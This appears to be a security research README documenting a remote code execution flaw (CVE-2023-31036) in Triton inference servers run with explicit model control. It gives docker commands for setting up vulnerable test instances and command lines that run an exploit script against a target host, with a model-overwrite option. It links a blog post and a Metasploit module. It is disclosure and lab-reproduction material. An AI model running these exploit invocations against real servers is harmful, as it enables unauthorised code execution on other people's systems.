# Triton inference server RCE

publicly exposed Triton inference servers before version 2.40 with the `--model-control explicit` option are vulnerable to remote code execution by dynamic model loading through the model control APIs.
Also, All versions with the `--model-control explicit` option and at least one loaded model can be overwritten by a malicious model and lead to RCE.

Detailed blog post: https://protectai.com/threat-research/triton-inference-server-arbitrary-file-overwrite
Metasploit module: https://github.com/protectai/ai-exploits/tree/main/triton

# An instance vulnerable to path traversal (CVE-2023-31036)
```bash
docker run --rm -p8000:8000 -p8001:8001 -p8002:8002 -v/APath1/:/models nvcr.io/nvidia/tritonserver:23.11-py3 tritonserver --model-repository=/models --model-control explicit
```
then run the Metasploit exploit:
```bash
python3 triton_model_rce.py --rhost yourTritonServerIP --command "A command to verify"
```

# An instance with at least one loaded model, all versions are affected
Copy the `SimpleModel` into `/APath2/` and then run the following:

```bash
docker run --rm -p8000:8000 -p8001:8001 -p8002:8002 -v/APath2/:/models nvcr.io/nvidia/tritonserver:23.10-py3 tritonserver --model-repository=/models --model-control explicit
```

then run the Metasploit exploit:
```bash
python3 triton_model_rce.py --rhost yourTritonServerIP --command "A command to verify" --overwrite true
```
